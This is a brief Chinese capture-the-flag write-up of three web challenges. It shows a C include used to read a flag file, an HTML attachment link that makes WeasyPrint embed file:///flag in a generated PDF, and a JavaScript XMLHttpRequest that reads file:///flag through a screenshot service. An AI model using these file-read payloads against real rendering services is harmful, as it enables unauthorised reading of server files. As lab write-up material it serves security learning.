## Caas
一句话测试
![](attachments/Pasted%20image%2020240331085938.png)

看报错是c语言试试include引入敏感文件

![](attachments/Pasted%20image%2020240331090322.png)

直接包含flag

![](attachments/Pasted%20image%2020240331090353.png)


## URL TO PDF
#WeasyPrint
监听端口，拿UA判断为WeasyPrint

![](attachments/Pasted%20image%2020240403124647.png)

```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
</head>  
<body>  
<link rel="attachment" href="file:///flag">  
</body>  
</html>
```

对拿到的文件binwalk -e 就可以

![](attachments/Pasted%20image%2020240403125409.png)

## ScreenShooter

![](attachments/Pasted%20image%2020240403132344.png)

```HTML
<!DOCTYPE html>
<html>
<head>
<title>wum0nster</title>
</head>
<body>
<script>
flag=new XMLHttpRequest;
flag.onload=function(){
    document.write(this.responseText)
};
flag.open("GET","file:///flag");
flag.send();
</script>
</body>
</html>
```